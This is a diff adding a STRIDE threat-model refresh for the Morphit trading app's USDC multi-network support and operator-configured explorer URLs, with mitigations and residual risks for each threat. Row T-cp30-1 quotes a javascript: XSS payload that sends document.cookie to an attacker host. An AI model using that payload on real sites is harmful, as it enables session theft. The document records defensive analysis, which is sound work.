@@ -863,3 +863,271 @@ by the project's threat model:
 state where every credible attacker behavior has either an
 in-code mitigation or an explicitly-accepted residual.  Filed
 items are long-term hardening, not pre-launch blockers.
+
+## Part 122 cp30 refresh — USDC + multi-network env-var explorer overrides (2026-05-18)
+
+This refresh covers the threat surfaces introduced by cp30 USDC addition,
+the cp30-DD wire-format closures (DD-10/10b/11), and the cp30-DD-DD audit
+fixes (SEC-1 through SEC-6, CODE-1 through CODE-3).  Existing STRIDE rows
+covering single-network multi-asset wire format remain in force; this
+refresh adds rows specific to USDC's 4-network shape and the per-network
+explorer URL override.
+
+────────────────────────────────────────────────────────────────────────
+
+## Spoofing — cp30 refresh
+
+### S-cp30-1 — Hostile peer spoofs USDC network discriminator
+**Surface:** Frontend (chat decoder) / Indexer (order handler)
+**Threat:** Attacker sends `{method:'usdc', network:'spl', address:'0xevm...'}`
+on the wire; receiver UI displays "SPL USDC address" with an EVM-format
+string; buyer routes funds incorrectly.
+**Mitigation:**
+- cp30-DD-DD SEC-3: decoder cross-validates `validateUsdcAddress(network,
+  address)` after parsing the network field — rejects mismatched address
+  shapes per network.
+- cp30-DD-DD SEC-6: encoder symmetric per-network validation — buggy
+  callers get a developer-time error instead of emitting silently-rejected
+  wire messages.
+- Wallet semantics provide a downstream backstop (Phantom rejects non-base58
+  on Solana, MetaMask rejects non-0x on Ethereum).
+**Residual risk:** Low.  Wire-format cross-validation is the authoritative
+gate; downstream wallet checks are bonus defense.
+**Gap:** None observed.
+
+### S-cp30-2 — Operator spoofs chain explorer to harvest user data
+**Surface:** Operator → user (privacy)
+**Threat:** Operator configures `MORPHIT_FRONTEND_USDC_ERC20_CHAT_LINK_URL=
+https://etherscan.io.spy.com/tx/{txid}` (typosquatted host).  Users
+clicking the chat-link send IP + tx context to attacker.
+**Mitigation:**
+- Documented operator-trust model: users explicitly trust their chosen
+  instance.  Self-host or pick a different operator if not.
+- `isValidChatLinkTemplate` enforces https://, requires literal `{txid}`,
+  parses as URL after substitution; no userinfo allowed.
+- Operators wanting to spy can already misconfigure single-network BTC/XMR/etc.
+  URLs (pre-cp30 capability) — cp30 adds the same attack surface for 8
+  more URLs but no new threat class.
+**Residual risk:** Operator-controlled threat; out of scope for Morphit's
+threat model per Memory #19 (privacy disclosed, not enforced against
+operator).
+**Gap:** None — disclosed in OPERATIONS.md privacy section.
+
+────────────────────────────────────────────────────────────────────────
+
+## Tampering — cp30 refresh
+
+### T-cp30-1 — Hostile indexer tampers with chat_link_urls.usdc / .usdt
+**Surface:** Indexer → Frontend
+**Threat:** Hostile/compromised indexer serves `chat_link_urls.usdc.erc20 =
+"javascript:fetch('https://attacker/'+document.cookie)"`.  Without defensive
+validation, frontend renders as `<a href="javascript:...">` → XSS on click.
+**Mitigation:**
+- cp30-DD-DD SEC-1: frontend re-validates operator-supplied template via
+  `isValidChatLinkTemplate` at every consumer site (externalExplorerUrl,
+  usdtExplorerUrl, usdcExplorerUrl).  Falls through to bundled default on
+  validation failure.
+- Svelte's `<a href={value}>` data binding HTML-escapes the value (but
+  doesn't validate scheme — SEC-1 closes the scheme gap).
+- `rel="noopener noreferrer"` + `target="_blank"` on the rendered link.
+**Residual risk:** Low.  The XSS surface is now fully gated.
+**Gap:** None observed.
+
+### T-cp30-2 — Tampering with USDC order asset_network via replace
+**Surface:** Indexer / chain
+**Threat:** Within the 15-minute replace window, attacker submits a replace
+op flipping `asset_network` from `erc20` to `polygon` (or other), tricking
+counterparties who had committed to the original chain.
+**Mitigation:**
+- cp30-DD-DD CODE-3: `orderReplace.ts` now extracts `asset_network` from
+  the replace payload AND checks it matches the target order's stored
+  value.  Mismatch → rejection with `replace_asset_network_change_forbidden`.
+- Per ADR-0023/0028, network is substance (not detail) for multi-network
+  assets — same posture as side/asset/fiat freeze.
+**Residual risk:** Low.  Network is now locked through replace, just like
+side/asset/fiat.
+**Gap:** No test coverage for the new rejection reason (filed as REVISIT
+for next-session smoke addition).
+
+### T-cp30-3 — Tampering with chat USDC payload network field
+**Surface:** Chain (custom_json) / Frontend (decoder)
+**Threat:** Attacker manipulates the `network` field on an in-flight USDC
+chat message.  Without strict allowlist, an attacker could inject a network
+value the decoder doesn't expect, causing downstream UI confusion.
+**Mitigation:**
+- Decoder uses strict `o.network !== 'erc20' && o.network !== 'spl' && ...`
+  literal-string comparison — case-sensitive, type-checked, allowlist-only.
+- cp30-DD-DD CODE-1: missing-network rejected for USDT/USDC methods (was
+  accepted with `network=undefined`).
+- cp30-DD-DD I-1: indexer order handler bounds input length before
+  toLowerCase to avoid memory waste on malformed inputs.
+**Residual risk:** None observed.
+
+### T-cp30-4 — USDC/LTC icon SVG tampering for asset confusion
+**Surface:** Frontend (static asset serving)
+**Threat:** Operator serves a tampered `icon-usdc.svg` that visually
+resembles a different asset (e.g., displays "$1000 USDC" branding to imply
+high value).  Phishing via brand-confusion.
+**Mitigation:**
+- Icons are served as `<img src="/icons/icon-usdc.svg">` (NOT inline
+  `{@html}`) so SVG-embedded `<script>` would not execute even if the
+  operator served a malicious file.
+- Operators can serve modified branding; users explicitly trust their
+  chosen instance.  Out of scope per operator-trust model.
+- The asset's TEXT identifier (USDC, ETH-20 etc.) is i18n-driven, not
+  derived from the icon.  Users seeing "USDC" with a misleading icon
+  would also see the correct asset ticker on the order row.
+**Residual risk:** Low.  Operator-controlled threat, disclosed.
+**Gap:** None — icon serving is `<img>` not `{@html}`.
+
+────────────────────────────────────────────────────────────────────────
+
+## Repudiation — cp30 refresh
+
+### R-cp30-1 — User claims their USDC trade didn't happen
+**Surface:** Indexer / chain
+**Threat:** Same as R1 in the base STRIDE matrix — every order op is a
+chain-signed custom_json with the signer's account, blockTime, and full
+payload on the blockchain.  USDC orders carry the same audit trail as
+USDT/BTC/etc.
+**Mitigation:** Same as R1: chain signing + indexer block-time captures.
+**Residual risk:** None — chain is the authoritative log.
+**Gap:** None.
+
+────────────────────────────────────────────────────────────────────────
+
+## Information disclosure — cp30 refresh
+
+### I-cp30-1 — USDC privacy-warning chip reveals user's intent
+**Surface:** Frontend (UI rendering)
+**Threat:** A user lingering on the post-order form with `asset=USDC`
+selected shows the `usdc_centralized` warning chip in the DOM.  If their
+session is captured (e.g., screen-share, browser-history-recovery), the
+chip's text reveals they were considering USDC.
+**Mitigation:**
+- Same posture as USDT (`usdt_centralized` warning, shipped cp3).  Not a
+  new threat — USDC just adds another asset whose users see an
+  informational chip.
+- Documented in OPERATIONS.md privacy section: users on shared devices
+  should clear their session.
+**Residual risk:** Same as USDT.  Acceptable.
+
+### I-cp30-2 — Per-network USDC explorer URL leak
+**Surface:** Operator → third party
+**Threat:** Every click on the USDC chat-link sends user IP + tx hash to
+the operator-configured explorer (default: etherscan.io, basescan.org,
+polygonscan.com, solscan.io).  Third party logs (operator does not).
+**Mitigation:**
+- Operator can override with `MORPHIT_FRONTEND_USDC_<NET>_CHAT_LINK_URL`
+  to point at self-hosted explorer.
+- Disclosed in /privacy/usdc per-asset guide.
+- User can copy txid manually instead of clicking — no forced disclosure.
+**Residual risk:** Same as USDT (cp3) and all single-network assets.
+Privacy-conscious operators self-host explorers; privacy-conscious users
+copy txids manually or use Tor.
+**Gap:** None observed.
+
+────────────────────────────────────────────────────────────────────────
+
+## Denial of service — cp30 refresh
+
+### D-cp30-1 — DoS via gigantic chat_link_urls env values
+**Surface:** Indexer (config parsing)
+**Threat:** Operator misconfigures env with a billion-char value for one
+of the 8 new chat-link URL env vars; indexer-side memory pressure on
+startup.
+**Mitigation:**
+- Zod schema `.max(512)` cap on every chat-link URL env var (single-network
+  + multi-network).  Indexer fails to start with a clear error message
+  instead of consuming unbounded memory.
+**Residual risk:** None.
+
+### D-cp30-2 — DoS via huge asset_network value in custom_json
+**Surface:** Indexer (order handler)
+**Threat:** Hostile chain peer broadcasts a `morphit_order_v1` with a
+multi-MB `asset_network` string; indexer wastes memory on `toLowerCase()`
+before rejecting via allowlist.
+**Mitigation:**
+- Chain-layer custom_json size cap (~8KB) bounds the practical worst
+  case.
+- cp30-DD-DD I-1 (this audit): indexer's order handler checks
+  `networkRaw.length > MAX_NETWORK_LEN` (16 chars) BEFORE allocating
+  `toLowerCase()` copy.  Same gate in orderReplace.
+**Residual risk:** None.
+
+### D-cp30-3 — ReDoS via USDC address/txid regexes
+**Surface:** Frontend (chat decoder) / Indexer (order handler)
+**Threat:** Hostile peer sends a pathological string that triggers
+catastrophic regex backtracking.
+**Mitigation:**
+- All cp30 regexes are anchored (`^...$`), bounded quantifiers
+  (`{32,44}`, `{64}`, etc.), no nested groups, no backreferences.
+- Verified during cp30-DD-DD security audit walkthrough.
+**Residual risk:** None.
+
+### D-cp30-4 — DoS via massive jitter amount in jitterStablecoinAmount
+**Surface:** Frontend (UI jitter computation)
+**Threat:** AddressShareModal calls `jitterAmountForAsset` on user input.
+A 12-digit `whole` × 1_000_000n BigInt multiplication is O(N) on digit
+count.
+**Mitigation:**
+- `AMOUNT_RE = /^\d{1,12}(?:\.\d{1,12})?$/` bounds input to 12 digits
+  before+after decimal.  Max BigInt value is ~24-digit decimal, well
+  within JS BigInt's native handling range.
+**Residual risk:** None.
+
+────────────────────────────────────────────────────────────────────────
+
+## Elevation of privilege — cp30 refresh
+
+### E-cp30-1 — USDC added to fee_method enum via misconfiguration
+**Surface:** Indexer (canonical registry) / chain
+**Threat:** A contributor patches `ASSETS` to flip USDC's
+`canPayListingFee:false → true`, allowing USDC to bypass the BLURT/BTC/XMR-only
+fee-method gate (Memory #23 frozen enum).
+**Mitigation:**
+- `usdc-trade-only-smoke.ts` (cp30, 14 scenarios) asserts
+  `canonical USDC.canPayListingFee === false` AND
+  `frontend USDC.canBeUsedForListingFee === false`.
+- `fee-method-enum-frozen-smoke.ts` asserts no asset can ever flip.
+- `disabled-assets-wizard-smoke.ts` asserts Category-B filter returns the
+  5 expected trade-only assets.
+- Three independent smokes from different angles catch any bypass attempt.
+**Residual risk:** None observed — multi-smoke regression layer is hard
+to coincidentally break.
+
+### E-cp30-2 — Operator privilege escalation via per-network env vars
+**Surface:** Operator → indexer
+**Threat:** Operator adds `MORPHIT_FRONTEND_USDC_NEW_NETWORK_CHAT_LINK_URL`
+for a network not in the canonical USDC supportedNetworks set.  Hostile
+indexer could ship orders claiming `asset_network='new_network'`.
+**Mitigation:**
+- Indexer Zod schema enumerates exactly the 4 USDT networks + 4 USDC
+  networks as known env-var names.  Unknown env vars are ignored by Zod
+  (not added to Config).
+- Indexer order handler's `USDC_NETWORKS_VALID = new Set(['erc20', 'spl',
+  'base', 'polygon'])` strict allowlist rejects unknown values.
+**Residual risk:** None — env vars not in the schema have no consumers.
+
+────────────────────────────────────────────────────────────────────────
+
+## Part 122 cp30 refresh summary
+
+| Category | New rows | Pre-existing rows still in force |
+|----------|----------|----------------------------------|
+| Spoofing | 2 (S-cp30-1, S-cp30-2) | S1, S2, S3, S4, S5, S6, S7 |
+| Tampering | 4 (T-cp30-1, T-cp30-2, T-cp30-3, T-cp30-4) | T1, T2, T3, T4, T5, T6, T7 |
+| Repudiation | 1 (R-cp30-1) | R1, R2, R3, R4 |
+| Information disclosure | 2 (I-cp30-1, I-cp30-2) | I1, I2, I3, I4, I5, I6, I7, I8 |
+| Denial of service | 4 (D-cp30-1, D-cp30-2, D-cp30-3, D-cp30-4) | D1, D2, D3, D4, D5, D6, D7 |
+| Elevation of privilege | 2 (E-cp30-1, E-cp30-2) | E1, E2, E3, E4 |
+
+**Net new threats:** 15 across 6 categories, all with explicit mitigations
+that were either part of the cp30 design (canonical allowlists, Zod caps,
+strict regex anchoring) or surfaced by the cp30-DD-DD security audit
+(SEC-1 through SEC-6, CODE-1 through CODE-3, I-1).
+
+**Outstanding gaps:** One — orderReplace `replace_asset_network_change_forbidden`
+needs test coverage.  Filed as REVISIT.
+
+**No criticals.**  The cp30 attack surface is well-mitigated end-to-end.
